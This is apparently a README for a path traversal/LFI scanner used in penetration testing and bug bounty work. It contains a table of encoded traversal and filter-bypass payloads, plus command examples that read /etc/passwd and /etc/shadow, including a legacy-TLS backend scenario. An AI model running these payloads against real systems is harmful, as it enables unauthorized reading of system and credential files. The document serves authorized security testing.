# 🔍 PathTravScan

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Use-Bug%20Bounty%20%7C%20Pentest-red?style=for-the-badge" />
</p>

> **Advanced Path Traversal / LFI Scanner** with Burp Suite–style repeater, 300+ auto-generated payloads across 14 encoding types, legacy TLS bypass, proxy support, and JSON/TXT reporting — all in a beautiful Rich terminal UI.

---

## ⚠️ Legal Disclaimer

> This tool is intended **exclusively** for authorized penetration testing, security research, and bug bounty programs where you have **explicit written permission** to test the target system.  
> Unauthorized use is **illegal** and may result in criminal prosecution under the CFAA or equivalent laws in your jurisdiction.  
> **The authors accept no liability for any misuse of this tool.**

---

## 📸 What It Looks Like

```
 ██████╗  █████╗ ████████╗██╗  ██╗    ████████╗██████╗  █████╗ ██╗   ██╗
 ██╔══██╗██╔══██╗╚══██╔══╝██║  ██║    ╚══██╔══╝██╔══██╗██╔══██╗██║   ██║
 ██████╔╝███████║   ██║   ███████║       ██║   ██████╔╝███████║██║   ██║
 ██╔═══╝ ██╔══██║   ██║   ██╔══██║       ██║   ██╔══██╗██╔══██║╚██╗ ██╔╝
 ██║     ██║  ██║   ██║   ██║  ██║       ██║   ██║  ██║██║  ██║ ╚████╔╝
 ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝

  Advanced Path Traversal Scanner  |  Burp-Style Repeater
  v1.0.0
  ⚠  FOR AUTHORIZED PENETRATION TESTING ONLY  ⚠
```

---

## ✨ Features

| Feature | Details |
|---|---|
| 🎯 **300+ Auto-Generated Payloads** | 14 encoding variants × up to 10 depths |
| 🔐 **Legacy TLS Bypass** | Reach servers that only accept TLS 1.0 (e.g. old SiteScope, HP products) |
| 🔄 **Burp Suite–Style Repeater** | Send manual requests, inspect raw request/response |
| 🧵 **Multi-threaded Scanning** | Configurable thread count for fast scans |
| 📡 **Proxy Support** | Route traffic through Burp Suite (`--proxy http://127.0.0.1:8080`) |
| 🧠 **Smart Detection** | Signature-based + heuristic confidence scoring (0–100%) |
| 🎯 **Severity Ratings** | CRITICAL / HIGH / MEDIUM / INFO |
| 📄 **JSON + TXT Reports** | Machine-readable and human-readable output |
| 📋 **Wordlist Import/Export** | Load custom payloads or export generated ones |
| 🖥️ **Rich Terminal UI** | Color-coded tables, progress bars, live findings |
| 🧙 **Interactive Wizard** | No flags needed — guided prompts for beginners |

---

## 🚀 Installation

### Prerequisites
- Python 3.8 or higher
- pip

### Steps

```bash
# 1. Clone the repository
git clone https://github.com/YourName/PathTravScan.git
cd PathTravScan

# 2. (Recommended) Create a virtual environment
python3 -m venv venv
source venv/bin/activate        # Linux/macOS
venv\Scripts\activate           # Windows

# 3. Install dependencies
pip install -r requirements.txt
```

That's it — no additional setup required.

---

## 📖 Usage

### Option 1: Interactive Wizard (Recommended for Beginners)

Just run with no arguments and follow the prompts:

```bash
python pathtravscan.py
```

You'll be guided through target URL, path, file, scan mode, proxy, and more.

---

### Option 2: Command-Line Flags

#### Quick Scan (Top 15 Payloads)

```bash
python pathtravscan.py \
  -u https://target.com \
  -p /SiteScope/htdocs/artwork \
  -f /etc/passwd \
  --mode quick
```

#### Full Scan (300+ Payloads)

```bash
python pathtravscan.py \
  -u https://target.com \
  -p /app/images \
  -f /etc/passwd \
  --mode full \
  -o reports/output.json
```

#### Full Scan via Burp Suite Proxy

```bash
python pathtravscan.py \
  -u https://target.com \
  -p /app/images \
  -f /etc/shadow \
  --mode full \
  --proxy http://127.0.0.1:8080 \
  --threads 5
```

#### Manual Repeater Mode

```bash
python pathtravscan.py repeater
```

Then enter URLs manually and inspect raw request/response pairs.

#### Generate Payload Wordlist Only

```bash
python pathtravscan.py generate \
  -p /app/images \
  -f /etc/passwd \
  --mode full \
  -o wordlists/my_payloads.txt
```

#### Scan with Custom Wordlist

```bash
python pathtravscan.py \
  -u https://target.com \
  -p /app \
  --wordlist wordlists/lfi_payloads.txt
```

---

### All Flags

```
  -u, --url           Target base URL (e.g. https://target.com)
  -p, --path          Vulnerable endpoint base path (e.g. /app/images)
  -f, --file          File to read (default: /etc/passwd)
  --mode              Payload mode: quick (15 payloads) | full (300+)
  --wordlist          Path to custom payload wordlist file
  --threads           Concurrent threads (default: 1)
  --delay             Delay between requests in seconds (default: 0)
  --timeout           Request timeout in seconds (default: 10)
  --proxy             Proxy URL (e.g. http://127.0.0.1:8080)
  --no-legacy-tls     Disable TLS 1.0 support
  --stop-on-first     Stop after first confirmed finding
  --show-all          Show all results in table, not just findings
  -o, --output        Output JSON report path (default: reports/report.json)
```

---

## 🧬 How the Payload Engine Works

PathTravScan generates payloads by combining **14 encoding types** with **variable traversal depths** (2–10 levels):

| Encoding Name | Sequence | Example |
|---|---|---|
| Basic | `../` | `../../../../etc/passwd` |
| URL Encoded | `%2e%2e%2f` | `%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| Mixed | `..%2f` | `..%2f..%2fetc/passwd` |
| Dot Encoded | `%2e%2e/` | `%2e%2e/%2e%2e/etc/passwd` |
| Upper URL | `%2E%2E%2F` | `%2E%2E%2F%2E%2E%2Fetc/passwd` |
| Double Encoded | `%252e%252e%252f` | `%252e%252e%252fetc%252fpasswd` |
| Unicode 1 | `..%c0%af` | `..%c0%af..%c0%afetc/passwd` |
| Unicode 2 | `..%c1%9c` | `..%c1%9c..%c1%9cetc/passwd` |
| Overlong | `%c0%ae%c0%ae/` | `%c0%ae%c0%ae/etc/passwd` |
| 16-bit | `%u002e%u002e/` | `%u002e%u002e/etc/passwd` |
| Backslash | `..%5c` | `..%5c..%5cetc/passwd` |
| Filter Bypass 1 | `....//` | `....//....//etc/passwd` |
| Filter Bypass 2 | `..././` | `..././..././etc/passwd` |
| Null Byte | `%00` | `../../../../etc/passwd%00.jpg` |

---

## 🧠 Vulnerability Detection

The detector uses **signature matching + heuristic scoring** to produce a confidence percentage:

```
Evidence matches found  →  +30% per match
HTTP 200 status         →  +15%
Response length > 200B  →  +5%
Looks like error page   →  -45% penalty
Very short body         →  -20% penalty
```

| Confidence | Severity |
|---|---|
| 80–100% | 🔴 CRITICAL |
| 60–79%  | 🟠 HIGH |
| 40–59%  | 🟡 MEDIUM |
| 0–39%   | ⚪ INFO (not reported) |

**Example signatures checked for `/etc/passwd`:**
```
root:x:0:  |  daemon:x:  |  nobody:x:  |  /bin/bash  |  /sbin/nologin
```

---

## 📂 Project Structure

```
PathTravScan/
│
├── pathtravscan.py           ← Main CLI entry point
│
├── scanner/
│   ├── __init__.py
│   ├── payload_engine.py     ← Payload generation (14 encodings × N depths)
│   ├── request_engine.py     ← HTTP engine with legacy TLS bypass + proxy
│   ├── vuln_detector.py      ← Signature + heuristic response analyser
│   ├── scan_engine.py        ← Orchestration, threading, callbacks
│   ├── reporter.py           ← JSON and TXT report generation
│   └── ui.py                 ← Rich terminal UI (tables, panels, progress)
│
├── wordlists/
│   ├── lfi_payloads.txt      ← Curated Linux LFI payloads
│   └── windows_payloads.txt  ← Curated Windows path traversal payloads
│
├── reports/                  ← Scan reports saved here at runtime
│
├── requirements.txt
├── .gitignore
└── README.md
```

---

## 🔥 Real-World Use Case (Like the Bug Bounty Example)

This tool was designed to find exactly the kind of vulnerability shown in the SiteScope example:

```bash
# 1. Target has a down frontend but exposed backend IP
# 2. Backend only accepts legacy TLS 1.0 — browsers reject it
# 3. No WAF on the backend IP

python pathtravscan.py \
  -u https://BACKEND-IP \
  -p /SiteScope/htdocs/artwork \
  -f /etc/passwd \
  --mode full \
  --legacy-tls \
  --threads 3 \
  -o reports/sitescope_scan.json
```

PathTravScan will:
1. Connect using legacy TLS 1.0 (browsers can't, but this tool can)
2. Try all 300+ encoded traversal variants
3. Detect `root:x:0:` in the response body
4. Report CRITICAL with confidence score and file content preview

---

## 🛡️ Responsible Disclosure

If you find a vulnerability using this tool:

1. **Do NOT exploit or exfiltrate data** beyond proof-of-concept
2. Contact the vendor/organization's security team
3. Follow their responsible disclosure policy (usually 90 days)
4. Report via HackerOne, Bugcrowd, or the program's submission form
5. Include your payload, response evidence, and impact assessment

---

## 🤝 Contributing

Pull requests are welcome! Here's how to contribute:

```bash
git fork https://github.com/YourName/PathTravScan
git checkout -b feature/your-feature-name
# make changes
git commit -m "feat: add your feature"
git push origin feature/your-feature-name
# open a Pull Request
```

**Ideas for contributions:**
- New encoding variants
- Additional target file signatures
- WAF detection module
- HTML report output
- Shodan integration for backend IP discovery
- More wordlists

---

## 📚 Resources & Learning

- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger — Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

## 🙏 Acknowledgements

- [Rich](https://github.com/Textualize/rich) — Beautiful terminal formatting
- [Requests](https://github.com/psf/requests) — HTTP library
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload inspiration


---

<p align="center">⭐ Star this repo if it helped you find a bug!</p>
